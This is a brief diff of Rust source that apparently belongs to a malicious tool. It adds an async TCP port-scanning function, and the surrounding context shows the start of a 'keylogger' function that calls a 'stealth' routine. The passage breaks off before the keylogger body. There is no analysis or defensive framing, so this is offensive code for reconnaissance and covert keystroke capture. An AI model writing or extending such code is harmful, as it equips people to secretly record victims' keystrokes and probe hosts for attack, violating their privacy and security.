@@ -49,6 +49,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 }
 
+async fn scan(target: &str, port: u16, logger: Arc<Mutex<Logger>>) {
+    let addr = format!("{}:{}", target, port);
+    match TcpStream::connect(&addr).await {
+        Ok(_) => {
+            let mut logger = logger.lock().unwrap();
+            let log_msg = format!("Port {} is open\n", port);
+            logger.log(&log_msg);
+        }
+        Err(_) => {}
+    }
+}
+
 fn keylogger() {
     stealth();
     let mut log = String::new();
